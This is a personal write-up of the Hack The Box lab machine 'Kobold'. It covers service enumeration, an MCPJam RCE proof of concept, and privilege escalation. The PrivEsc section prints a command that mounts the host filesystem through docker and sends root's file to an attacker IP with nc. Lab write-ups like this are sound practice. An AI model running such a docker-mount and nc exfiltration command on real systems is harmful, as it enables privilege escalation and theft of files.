# HTB - Kobold

---
## General Info

- OS: Linux
- Open ports: 22, 80, 443, 3552
- Running services: Ssh (9.6p1), nginx (1.24.0) and SSL, Golang, Arcane (1.13.0) on port 3552, using Go (1.25.5), MCPJam (1.4.2)
- Endpoints: none
- Arcane endpoints:
	- /img
	- /_ app
		- /version.json
	- /api
		- /app-version
		- /auth/me
		- /environments
			- /0/settings/public
		- /templates (200)
		- /docs (200)
		- /users (401)
		- /events (401)
		- /health (200)
		- /version (200)
		- /enviroments (401)
		- /openapi.json
		- /docs
- Auth:
	- Auth endpoint: /api/auth/me
- Vhosts: mcp.kobold.htb
	- Endpoints:
		- /api
			- /mcp/servers
			- /mcp-cli-config
- Docker Host: unix:///var/run/docker.sock
- Pwnd date: 26/04/2026

---
## Enumeration  

- Ran Nmap and found port 22, 80, 443 and 3552 open. 
- Ran basic fuzzing. Found no endpoint
- Entered website, it's empty but contains an email: admin@kobold.htb. No JS, no API calls.
- Curled server in port 3552, found a basic answer, opened in web and found [Arcane](https://github.com/getarcaneapp/arcane) login page.
- Found [CVE-2026-23944](https://app.opencve.io/cve/CVE-2026-23944) on Arcane versions prior to version 1.13.2.
- Fuzzed arcane jic. As well as the API. Fuzzed for VHosts as well.
- Robots.txt doesn't exist.
- While fuzzing, I checked in Burpsuite the assets requested and the answers. Mapped the server further. Found an interesting setting, authLocalEnabled = true. Keeping that in mind.
---
## Exploitation  

-  CVE-2026-23944 is not helpful. Tried to gather more info, but nothing usable. 

---
I had to check the writeup. Arcane was indeed well secured. Idk why, vhost fuzzing failed. Host mcp.kobold.htb discovered. 

### Learnt: idk man maybe the wordlist was off...? The command was right and Nmap didn't give me any info. 

---
## Enumeration (PIVOTING TO MCP)  

- Checked in Burp, and found two api requests being done. API was empty.
- After fuzzing the main path / and getting nothing, fuzzing /api.
- Found MCPJam version 1.4.2 and searched known vulns. Found RCE [[CVE-2026-23744]].

---
## Exploitation  

-  Trying [[CVE-2026-23744]] PoC. Got a terminal, but unstable and probably sandboxed.
-  Nope. Not sandboxed. Got user flag. I first will stabilize the terminal. 
-  Starting PrivEsc

---
## PrivEsc

-  After  stabilizing the shell, I realized that MCP was running as root. And after investigating the CVE, I came to the realization that this was an RCE vuln, and just ran (formatted to the API)

```bash
sg docker -c docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc 10.10.14.119 4444
```
that effectively:
1. Changed user to docker
2. Mounted / in /hostfs
3. Used an already existing docker image
4. Cat /root/root.txt and sent it through nc to my attacker pc

- Kobold rooted. Got root flag.

---
## Notes  

- Machine rating: Medium
